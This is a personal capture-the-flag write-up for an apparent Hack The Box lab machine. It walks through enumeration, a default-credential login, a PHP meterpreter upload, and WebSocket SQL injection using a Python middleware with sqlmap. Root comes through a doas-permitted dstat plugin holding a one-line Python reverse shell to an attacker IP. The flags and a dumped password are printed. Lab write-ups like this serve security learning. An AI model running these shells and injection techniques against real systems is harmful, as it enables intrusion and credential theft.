## Enumeration   
10.10.11.194

Enumerate services
-p22 ssh
-p80 http
-p9091smt mail(could be anything...later find out its for the api)

p80 has a webpage

Check for subdomains
run fuzz FUZZ.soccer.htb -->none fd

check subdir
/usr/share/wordlists/dirb/big.txt (small didnt work)
`dirb soccer.htb/FUZZ` --> found `soccer.htb/tiny`

/tiny is a tiny file manager 
--> checking the Github provided for the source code/usage
--> find default creds in the github and try it
admin/admin123

## Foothold
Allows uploading of files into /tiny/uploads folder
Upload a linux/meterpreter/ shell.php
Start listener on msfconsole with **correct payload**!!!
execute /tiny/uploads/shell.php

Inital foothold "www-data" gained
Upgrade shell or watever

#### Enum inside
Enumerate watever.
player flag
/home/player

Some users found?
root
player

`cat /etc/hosts` or go to nginx enabled sites in dir (/etc/nginx/sites-enabled)
Or get linpeas in somehow and execute (could get it to work prbly need it in some special folder ie uploads or smt)

Checkout soc-player.soccer.htb (after adding to /etc/hosts locally)
Signup and login page. Try to signup/login

Takes you to `soc-player.soccer.htb/check` which has an input field 
Check page source which shows the scripts used
```python
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");

###########################################################
 function sendText() {
            var msg = input.value;
            if (msg.length > 0) {
                ws.send(JSON.stringify({
                    "id": msg
                }))
            }
            else append("????????")
```
Page connects to websocket on p9091 likely a SQLdatabase

When "Enter" key is pressed, takes input in the input field as id
Then uses id to send the sql query
SQLi likely possible here
Note: WebSocket (socket conenction) is used here instead of HTTP(req/res model)
Websocket - Asynchronous (Cant repeat requests like in burpsuite)
HTTP - Synchronous


The script uses a websocket so blind injection over websocket possible (google it for the python code)
- http is still used to initiate connection
- websocket handles the payload transfer
```python
from http.server import SimpleHTTPRequestHandler  
from socketserver import TCPServer  
from urllib.parse import unquote, urlparse  
from websocket import create_connection
  
ws_server = "ws://soc-player.soccer.htb:9091"  
  
def send_ws(payload):  
	ws = create_connection(ws_server)  
	# If the server returns a response on connect, use below line  
	
	#resp = ws.recv() 
	# If server returns something like a token on connect you can find and extract from here  
	  
	# For our case, format the payload in JSON  
	message = unquote(payload).replace('"','\'')
	# replacing " with ' to avoid breaking JSON structure  
	
	data = '{"id":"%s"}' % message  
	ws.send(data)  
	resp = ws.recv()  
	ws.close()  
	  
	if resp:  
		return resp  
	else:  
		return ''  
  
def middleware_server(host_port,content_type="text/plain"):  
  
	class CustomHandler(SimpleHTTPRequestHandler):  
		def do_GET(self) -> None:  
			self.send_response(200)  
		try:  
			payload = urlparse(self.path).query.split('=',1)[1]  
		except IndexError:  
			payload = False  
	  
	if payload:  
		content = send_ws(payload)  
	else:  
		content = 'No parameters specified!'  
		  
		self.send_header("Content-type", content_type)  
		self.end_headers()  
		self.wfile.write(content.encode())  
	return  
  
class _TCPServer(TCPServer):  
	allow_reuse_address = True  

#starts http server to receive reqeusts
httpd = _TCPServer(host_port, CustomHandler)  
httpd.serve_forever()
  

print("[+] Starting MiddleWare Server")  
print("[+] Send payloads in http://localhost:8081/?id=*")  

#receives response from sqlmap and sends to the ws
try:  
	middleware_server(('0.0.0.0',8081))
except KeyboardInterrupt:  
	pass
```

Run this program locally.

Then run sqlmap on another terminal with
`sqlmap -u “http://localhost:8081/?id=1" -p “id”`
--> sqlmap injects into the id field from this get param to the middleware
--> middleware sends ws requests to the webserver ws:// service
--> then middleware receives response on its on server and sends to sqlmap


`sqlmap -u “http://localhost:8081/?id=1" -p “id” --dump`
Database: soccer_db
Table: accounts
[1 entry]

+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+


## User 
SSH in using creds found

userflag
787e4332ddfcd8927177c1689178876b



Running linpeas found quite alot of stuff (try anyt)
/usr/local/bin/doas
/usr/bin/su

Linpeas checked the doas.conf
Here doas.conf found with the following rule:
`permit nopass player as root cmd /usr/bin/dstat`

Allows user "player" to run as "root" to cmd in the /usr/bin/dstat dir
--> So if user can get code to run in dstat it would run as root

Look for the dstat bin
`find / -type d  -name dstat 2>/dev/null`
Found:
	/usr/share/doc/dstat
	/usr/share/dstat
	/usr/local/sahre/dstat  --> the only useful dir

Create a python reverse shell plugin `dstat_anything.py` :
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.11",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")

```

note: for some reason only single line file taken from revershell .com is allowed. Couldnt get a whole script (properly formated) to run. 
**Rmb to change ip and port to ur own. dstat_ must be used in the naming also**

`doas -u root /usr/bin/dstat --anything.py`
On another terminal
`nc -lvnp 1234`



root flag baby!!!!!
4c657c2bc8c27020ec1e5154727ecfea


Learning areas:
- Websocket ws:// is not the same as HTTP (oh.....)
- Sometimes middleware needed but can be found online
- Doas is like Sudo but designed to be lightweight for OpenBSD
- Dstat allows runnning of custom plugins named `dstat_<name>.py` in the /usr/bin/dstat dir
- Dstat is like netstat to display system resource stats but allows customisation

Polishing:
- Always check the default creds
- Use a larger wordlist for dir enums (the default ones rarely work)
- Always check page source for scripts]
- Puting scripts in tmp then cp it to required location (ie to /usr/bin/dstat) can prevent heaache from it being deleted constantly